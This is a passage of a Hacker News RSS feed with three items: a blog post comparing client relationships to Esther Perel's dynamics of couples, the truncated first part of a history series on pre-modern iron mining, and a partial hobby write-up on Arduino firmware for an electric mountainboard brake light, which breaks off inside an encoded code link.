<p>It’s more interesting when we apply the power dynamics of romantic relationships. Esther Perel, a well known psychotherapist and speaker, was <a href="https://tim.blog/2017/05/21/esther-perel/">on the Tim Ferriss podcast</a> a few years back. She said something that stuck with me enough to motivate me to spend 15 minutes finding the exact quote:</p>



<blockquote><p>In every couple you will often find one person who is more in touch with the <em>fear of losing the other</em>, and one person who is more in touch with the <em>fear of losing themselves</em>. </p><p>One person more in touch with the <em>fear of abandonment</em>, and one person more in touch with the <em>fear of suffocation</em>.</p><cite>Esther Perel (<a href="https://tim.blog/2018/06/01/the-tim-ferriss-show-transcripts-esther-perel/#:~:text=Every%20couple%20has%20a%20setup.%20It%E2%80%99s%20an%20organization.%20In%20every%20couple%20you%20will%20often%20find%20one%20person%20who%20is%20more%20in%20touch%20with%20the%20fear%20of%20losing%20the%20other%2C%20and%20one%20person%20who%20is%20more%20in%20touch%20with%20the%20fear%20of%20losing%20themselves.%20One%20person%20more%20in%20touch%20with%20the%20fear%20of%20abandonment%2C%20and%20one%20person%20more%20in%20touch%20with%20the%20fear%20of%20suffocation">transcript here</a>)</cite></blockquote>



<p>Are client relationships like that? I think so. It could go either way:</p>



<ul><li>The client is afraid that the contractor whom they rely on will move onto a higher paying or more interesting client (<em>fear of abandonment</em>)</li><li>The contractor is afraid that continuing to work with their client will prevent them from growing and learning new things (<em>fear of suffocation</em>)</li></ul>



<p>Or, going the other way:</p>



<ul><li>The client is afraid that the contractor’s low quality work or outdated solutions will hold them back (<em>fear of suffocation</em>)</li><li>The contractor is afraid that the client will fire them and hire someone selling shiny new unproven technology (<em>fear of abandonment</em>)</li></ul>



<p>Does any of that sound familiar? It does to me.</p>



<p>Who holds the most power in those situations? Obviously we’d prefer that whatever side we’re on has the power. But ideally both sides would hold equal power, so neither side needs to act out of fear.</p>



<p>It sounds like a chicken/egg problem: do we equalize power by getting rid of fear, or do we get rid of fear by equalizing power? But that’s a false dichotomy. Those are both symptoms of the larger issue: we aren’t communicating. Fix the communication and we fix both symptoms of it.</p>



<p>In a romantic relationship, we’d want to talk about this stuff, right? Get it out in the open and have a mature, honest conversation. Maybe even see a relationship counselor. </p>



<p>So why not do that with our client? It goes back to my post “<a href="https://critter.blog/2020/08/25/hide-a-problem-from-your-client-and-now-youve-got-2-problems/">Hide a problem from your client and now you’ve got 2&nbsp;problems</a>“. If we’re feeling a fear of suffocation or abandonment, or we suspect that they are, why wouldn’t we bring it up and talk through it with them?</p>



<p>What do you think? <a href="https://twitter.com/mcrittenden">Tweet me</a>!</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/09/18/dating-our-clients/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517907</guid>
            <pubDate>Fri, 18 Sep 2020 15:20:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iron, How Did They Make It? Part I, Mining]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 44 (<a href="https://news.ycombinator.com/item?id=24517792">thread link</a>) | @dddddaviddddd
<br/>
September 18, 2020 | https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week we are starting a four-part look at pre-modern iron and steel production.  As with our series on farming, we are going to follow the train of iron production from the mine to a finished object, be that a tool, a piece of armor, a simple nail, a weapon or some other object.  <strong>And I want to stress that broad framing</strong>: iron was made into more things than <em>just</em> swords (although swords are cool).  If you are here wondering how you go from iron-bearing rocks to a sword, these posts will tell you, but they will equally get you from those same rocks to a nail, or a workman’s hammer, or a sawblade, or a pot, or a decorative iron spiral, or a belt-buckle, or any other of a multitude of things that might be produced in iron.</p>



<p>Iron production is a unique topic in one key way.  If the problem with <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farmers </a>is that the popular understanding of the past (either historical or fantastical) renders them <a href="https://acoup.blog/2019/07/12/collections-the-lonely-city-part-i-the-ideal-city/">effectively invisible</a> – as indeed, it tends to render <em>most</em> ancient forms of production invisible – <strong>iron-working is tremendously visible, but in a series of motifs that are almost completely</strong> <em><strong>wrong</strong></em>.  Iron is treated as rare when it is common, melted in societies that almost certainly lack the furnaces to do so; swords are cast when they should be forged, quenched in ways that would ruin them and the work of the iron-worker is represented as a solitary activity when every stage of iron-working, when done at any kind of scale, was a team job (many modern traditional blacksmiths work alone, often as a hobby; ancient smiths generally did not).  The popular depiction is so consistently wrong that it doesn’t really even provide a firm basis for correction.  <strong>We are going to have to start over, from the beginning</strong>.</p>



<p><strong>So this first post is going to focus on mining</strong>.  Next week we’ll take a look at ore processing, smelting in more detail, along with the pressing issue of fuel.  The week after that we’ll look at the basic principles behind forging.  And finally in the last week, we’ll ask what one might do if they wanted <em>steel</em> instead of iron.  As with the farming posts, there are likely to be some addendum (at least one, on Wootz steel, for sure).  <strong>Throughout all of this, we are going to look not only at the processes by which these objects were produced, but also the people who did that production.</strong></p>



<figure><img data-attachment-id="4507" data-permalink="https://acoup.blog/saam-1910-9-11_1/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg" data-orig-size="800,480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="saam-1910.9.11_1" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" src="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg 800w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=768 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption><a href="https://americanart.si.edu/artwork/iron-mine-port-henry-new-york-16373">Via the Smithsonian</a>, a painting of an iron mine by Homer Dodge Martin (c. 1862) at Port Henry, New York.  By the 1800s, increases demand for iron ore to fuel the industrial revolution had made larger underground iron mines more common.  Here you can actually see the tailings (rock with little or no iron content which is sorted out at the mine) littering the rock face down to the shore.</figcaption></figure>



<p><strong>As with farming, there is a regional and chronological caveat necessary here</strong>: my research into metal production (and this, even more than farming, is core to my academic interests) is focused on the Roman world or – more broadly – on the broader Mediterranean and European tradition of metal-working.  There are some points where it will be necessary to note different methods or techniques in other parts of the world (early cast iron in China, for instance, or Wootz steel in India).  Likewise, I will do my best to capture changes in metal-working techniques in the medieval period.  What I am <em><strong>not </strong></em>going to cover in detail is <em>modern</em> steel and iron-working (that is, post-industrial-revolution), though I will occasionally note how it is different (the largest difference, by far, is that modern steel-making approaches the carbon problem from the opposite direction, with processes to <em>remove</em> carbon, instead of processes to add carbon).</p>



<p>I should also note that this post is going to focus on <em>iron</em>-working (and steel-working).  Copper and bronze, the other major tool-metals, are quite different (and may get their own series at some point)!</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>





<p><strong>Bibliography Note at the Outset</strong>: For the sake of keeping these posts readable, especially since I don’t have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I am going to include a bibliography up-front for the entire series.  For the beginner looking to get a basic handle on the pre-modern iron-production process, I think D. Sim &amp; I. Ridge, <em>Iron for the Eagles: The Iron Industry of Roman Britain</em> (2002) offers one of the best whole-process overviews.  On technical details of the forging process, note A.W. Bealer, <em>The Art of Blacksmithing</em> (1969), though much of the same may be learned by conversing with traditional blacksmiths.  H. Hodges, <em>Artifacts: An Introduction to Early Materials and Technology</em> (1989) is more diffuse, but still has some useful information on metal production.<br>There is a robust if somewhat aging literature on Roman mining and metallurgy.  Of particular note are (in publication order) J.F. Healy, <em>Mining and Metallurgy in the Greek and Roman World</em> (1978); R.F. Tylecote, <em>The Early History of Metallurgy in Europe</em> (1987); R. Shepherd, <em>Ancient Mining</em> (1993); P. Craddock, <em>Early Metal Mining and Production </em>(1995); V.F. Buchwald, <em>Iron and Steel in Ancient Times</em> (2005).  Each of these volumes has their own advantages.  Healy and Shepherd are more narrowly focused on Greek and Roman antiquity; Healy has the better coverage of processes, Shepherd the better catalog of known metal mining and processing sites in antiquity.  Both Tylecote and Craddock have a wider chronological reach; Craddock is in some ways an update of Tylecote, but the former has a stronger focus on artifacts than the latter.  Buchwald is narrowly focused on iron (the others all consider at least bronze, if not also non-tool metals) and of course, the most recent.  Finding any study on the condition of medieval mine-workers was difficult (being so far out of my field), but note J.U. Nef, “Mining and Metallurgy in medieval Civilisation” in <em>The Cambridge Economic History</em> <em>of Europe</em>, <em>volume 2: Trade and Industry in the Middle Ages</em>, 2nd. ed. (1987): 691-761.<br>For the particulars of how that iron might be turned into armor, note D. Sim and J. Kaminski, <em>Roman Imperial Armour: The Production of Early Imperial Military Armour</em> (2012) for the Roman period and A. Williams, <em>The Knight and the Blast Furnace: A history of the metallurgy of armour in the Middle Ages &amp; the early modern period</em> (2003).  For metallurgy as it fits into mobilization more generally, J. Landers, <em>The Field and the Forge: Population, Production and Power in the Pre-Industrial West</em> (2003) is a peerless starting point.<br>On the value and trade in metals in the ancient world, of particular note are M. Treister, <em>The Role of Metals in Ancient Greek History</em> (1996) and L. Bray, “‘Horrible, Speculative, Nasty, Dangerous’: Assessing the Value of Roman Iron,” <em>Britannia</em> 41 (2010): 175-185.  Both of these have valuable price-data from the ancient world.</p>



<h2>Iron Ores</h2>



<p>In most video games, if you are looking to produce some iron things, the first problem you invariably have is <em>finding some iron</em> <em>ores</em>.  Often iron is some sort of<a href="https://civilization.fandom.com/wiki/Iron_(Civ4)"> semi-rare strategic resource</a> available in <a href="https://anno1800.fandom.com/wiki/Iron_Mine">only certain parts of the map</a>, something that factions might fight over.  Actually finding some iron might be a serious problem.</p>



<p>Well, I have good news for <em>historical</em> you as compared to <em>video game</em> you: iron is the fourth most common <a href="https://en.wikipedia.org/wiki/Abundance_of_elements_in_Earth%27s_crust#cite_note-7">element in earth’s crust</a>, making up around 5% of the total mass of the part of the earth we can actually mine. Modern industry produces – and I mean this very literally – a <em>billion tons</em> (and change) of iron per year.  Iron is about the exact opposite of rare; almost all of the major ores of iron are dirt common.  <strong>And that’s the point</strong>.</p>



<p>One of the reasons that the change from using bronze (or copper) as tool metals to using iron was so important historically is that iron is just <em>so damn abundant</em>.  Of course iron can be used to make <em>better</em> tools and weapons as well, but only with proper treatment: initially, the advantage in iron was that it was <em>cheap</em>.  Now, as we’ll see, while the abundance of iron makes it cheap, the difficulty in working it poses technological problems; that’s why the far rarer and also generally inferior (to proper, work-hardened, heat-treated iron or steel; bronze will often exceed the performance of unalloyed iron) copper and bronze were used first: harder to find, easier to work.  We’ll get to the major problems with iron-working in subsequent weeks (they are in the processing, not the mining), but in brief the problems iron has is that it has a much higher melting point and that <em>cast</em> iron is functionally useless.  <strong>But let’s get back to those sources of iron</strong>.</p>



<p>Very small amounts of iron occur on earth as pure ‘native’ metal; the term for this, “<a href="https://en.wikipedia.org/wiki/Meteoric_iron">meteoric iron</a>” is an accurate description of where it comes from (there is also one known deposit of native ‘<a href="https://en.wikipedia.org/wiki/Telluric_iron">telluric iron</a>‘); in practice, the sum total of these iron sources is effectively a rounding error on the amount of iron an iron-age society is going to need and so ‘pure’ iron may be disregarded as a meaningful source of iron.</p>



<figure><img data-attachment-id="4509" data-permalink="https://acoup.blog/hematite_streak_plate/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg" data-orig-size="1280,547" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;4&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon PowerShot SX710 HS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1451453273&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.5&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.008&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="hematite_streak_plate" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg 1280w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://en.wikipedia.org/wiki/Hematite">Via Wikipedia</a>, Hematite, leaving its characteristic red-rust streak.  The hematite on the left has a metallic lustre, whereas the hematite on the right has the (more common) earthy lustre.</figcaption></figure>



<p><strong>Instead, basically all iron was smelted from iron ores which required considerable processing to produce a pure metal</strong>.  There are quite a lot of ores of iron, but not all of them could be usefully processed with ancient or medieval technology.  The most commonly used iron ore was hematite (Fe<sub>2</sub>O<sub>3</sub>), with goethite (HFeO<sub>2</sub>) and limonite (FeO(OH)·<em>n</em>H<sub>2</sub>O) close behind.  Rarer, but still used was …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517792</guid>
            <pubDate>Fri, 18 Sep 2020 15:13:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Evening Project: Arduino based brake light controller for Electric Mountainboard]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517767">thread link</a>) | @gcds
<br/>
September 18, 2020 | https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Evening Project: Arduino based brake light controller for VESC based Electric Mountainboard">
            </figure>

            <section>
                <div>
                    <p>I had a small request from my father to help him develop a small firmware for Arduino to control brake LED light for his electric mountain board, integrating with VESC to receive remote controller UART packets.</p><h2 id="some-explanations">Some explanations</h2><p>I know some of you have not heard Arduino, VESC, Electric Mountainboard, and similar terms.</p><h3 id="arduino">Arduino</h3><p><a href="https://www.arduino.cc/">Arduino</a> is an open-source hardware and software project and user community that designs and manufactures single-board microcontrollers and microcontroller kits for building digital devices.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-71.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-71.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-71.png 1000w, https://www.techprowd.com/content/images/2020/09/image-71.png 1020w" sizes="(min-width: 720px) 720px"></figure><p>In this project, our target will be the Arduino Pro Micro board based on the <a href="https://www.microchip.com/wwwproducts/en/ATmega32u4">ATMega32U4</a> processor featuring 32 KB self-programming flash program memory, 2.5 KB SRAM, 1 KB EEPROM, USB 2.0 full-speed/low-speed device, 12-channel 10-bit A/D-converter, and JTAG interface for on-chip-debug. The device achieves up to 16 MIPS throughput at 16 MHz. 2.7-5.5 volt operation.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-72.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-72.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-72.png 1000w, https://www.techprowd.com/content/images/2020/09/image-72.png 1032w" sizes="(min-width: 720px) 720px"></figure><h3 id="vesc">VESC</h3><p>The <a href="https://vesc-project.com/">VESC</a> (which stands for Vedder Electronic Speed Controller) is a more advanced ESC that allows for better motor and battery protection, regenerative braking, and programming options like acceleration-deceleration curves and other advanced features.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-73.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-73.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-73.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-73.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-73.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>It is an open-source ESC project and has many hardware projects based on its firmware.</p><h3 id="electric-mountainboard">Electric Mountainboard</h3><p>The Electric mountainboard, in simple terms, is an electrified mountainboard.</p><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg" width="4032" height="2877" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 2400w" sizes="(min-width: 720px) 720px"></p></div><div><p><img src="https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg" width="768" height="1024" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 768w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>Mountainboarding, also known as Dirtboarding, Offroad Boarding, and All-Terrain Boarding (ATB), is a well established[1] if little-known action sport, derived from snowboarding. This was initially pioneered by James Stanley during a visit in the 1900s to the Matterhorn where snow was not available. A mountainboard is made up of components including a deck, bindings to secure the rider to the deck, four wheels with pneumatic tires, and two steering mechanisms known as trucks. Mountainboarders, also known as riders, ride specifically designed boardercross tracks, slopestyle parks, grass hills, woodlands, gravel tracks, streets, skateparks, ski resorts, BMX courses, and mountain bike trails. It is this ability to ride such a variety of terrain that makes mountainboarding different from other board sports.</p><h2 id="remote-controller">Remote Controller</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-77.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-77.png 600w, https://www.techprowd.com/content/images/2020/09/image-77.png 768w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-leading-subject-the-brake-light">The leading subject the Brake Light</h2><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.18.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.18.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.13.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.13.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.26.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.26.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg 1280w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>This article's main subject is brake light, which is needed to work like car brake lights.</p><ul><li>Then the board is powered, it should shine with the brightness of around 45%</li><li>When the remote controller starts sending a brake signal, the Arduino should pick up the packets from the remote controller receiver, which are being sent to VESC and set brightness to 100% and return to 45% when the brake signal is released.</li></ul><p>The LED lamp is powered by the Mean Well LDD-H series LED driver, which can control LED brightness by providing a PWM signal.</p><p>The board is powered by 12S Li-Ion cells based battery pack with a standard voltage of 44.4V and a fully charged voltage of 50.4V.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-75.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-75.png 600w, https://www.techprowd.com/content/images/2020/09/image-75.png 1000w" sizes="(min-width: 720px) 720px"></figure><h2 id="schematic">Schematic</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-76.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-76.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-76.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-76.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-76.png 2400w"></figure><p>The schematic idea is pretty simple. Arduino receives the same packets as VESC from receiver via <a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">UART</a>, from which I can decode the throttle position and accordingly adjust brake lights via <a href="https://en.wikipedia.org/wiki/Pulse-width_modulation">PWM</a> signal on LED driver.</p><h2 id="firmware">Firmware</h2><p>For firmware, I will be using Arduino software to write the firmware with C++ with some helper functions, instead of bit-banging registers by myself.</p><h3 id="first-step-vesc-packet-listener-handler">First step Vesc Packet Listener &amp; Handler</h3><p>To determine the throttle position of the Remote controller, I need to parse incoming serial data from the receiver as this type of remote controller uses VESC UART style control instead of a typical PPM (RC controller similar to PWM) style control mechanism.</p><p>I have built a small class to parse incoming serial data and extract the payload out of the received packet. I used <a href="https://github.com/SolidGeek/VescUart">SolidGeek/VescUart</a> library as a reference for the code. Added some magic to be able quickly to hook callback when a specific type of commands there received.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523pragma%2520once%250A%250A%2523include%2520%253CHardwareSerial.h%253E%250A%2523include%2520%2522vesc_types.h%2522%250A%250Atypedef%2520void%2520(*vesc_command_handler_callback)(uint8_t%2520*payload%252C%2520uint16_t%2520length)%253B%250A%250Atypedef%2520struct%2520%257B%250A%2520%2520%2520%2520vesc_command_id%2520commandId%253B%250A%2520%2520%2520%2520vesc_command_handler_callback%2520callback%253B%250A%257D%2520vesc_command_handler%253B%250A%250Aclass%2520VescUart%2520%257B%250Apublic%253A%250A%2520%2520%2520%2520explicit%2520VescUart(HardwareSerial%2520*port)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520malloc(sizeof(vesc_command_handler))%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlerSize%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253Eport%2520%253D%2520port%253B%250A%2520%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520void%2520addCommandHandler(vesc_command_id%2520commandId%252C%2520vesc_command_handler_callback%2520callback)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520vesc_command_handler%2520handler%2520%253D%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.commandId%2520%253D%2520commandId%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.callback%2520%253D%2520callback%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520realloc(%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(this-%253EcommandHandlerSize%2520%252B%25201)%2520*%2520sizeof(vesc_command_handler)%250A%2520%2520%2520%2520%2520%2520%2520%2520)%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bthis-%253EcommandHandlerSize%252B%252B%255D%2520%253D%2520handler%253B%250A%2520%2520%2520%2520%257D%250A%250A%250A%2520%2520%2520%2520bool%2520checkVescPacket()%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520payload%255B256%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520payloadSize%2520%253D%2520receivePacket(payload)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520if%2520(payloadSize%2520%253E%25200)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520commandId%2520%253D%2520payload%255B0%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520for%2520(uint8_t%2520i%2520%253D%25200%253B%2520i%2520%253C%2520this-%253EcommandHandlerSize%253B%2520i%252B%252B)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%